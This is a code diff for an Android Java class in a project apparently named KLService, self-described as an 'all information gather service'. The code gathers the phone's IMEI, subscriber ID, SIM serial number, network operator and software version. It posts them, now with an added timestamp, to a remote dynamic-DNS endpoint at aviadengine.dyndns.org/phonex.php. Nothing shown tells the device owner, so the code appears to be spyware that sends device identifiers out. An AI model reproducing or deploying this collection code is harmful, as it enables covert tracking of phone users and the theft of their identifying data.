@@ -1,9 +1,21 @@
+/********************************************************************************
+ * KLService
+ * ---------
+ * A general purpose all information gather service. 
+ * Class: KLSActivity.
+ * Class Description: Starter application for KLService main functionality. 
+ * Author: Aviad Golan -=OverFlow=-
+ * 			(aviadgolan@gmail.com)
+ ********************************************************************************/
+
 package com.OverFlow.KLService;
 
 import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 import org.apache.http.HttpResponse;
@@ -42,6 +54,10 @@ public class KLSHttpSender {
 			mHttpPost.setURI(new URI("http://aviadengine.dyndns.org/phonex.php"));
 		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
 		    nameValuePairs.add(new BasicNameValuePair("Data ", "Start:"));
+	    	long dateTaken = System.currentTimeMillis();
+	        Date date = new Date(dateTaken);
+	        SimpleDateFormat dateFormat = new SimpleDateFormat("d/MM/y_H:m:s");
+	        nameValuePairs.add(new BasicNameValuePair("TimeStamp", dateFormat.format(date)));
 		    if (Long.parseLong(mTelephonyManager.getDeviceId()) > 0) {
 			    nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
 			    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
@@ -50,7 +66,7 @@ public class KLSHttpSender {
 			    nameValuePairs.add(new BasicNameValuePair("Network Operator", mTelephonyManager.getNetworkOperator()));
 			    nameValuePairs.add(new BasicNameValuePair("Network Operator Name", mTelephonyManager.getNetworkOperatorName()));
 			    nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
-			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));			    
+			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));
 		    }
 		    else {
 		    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
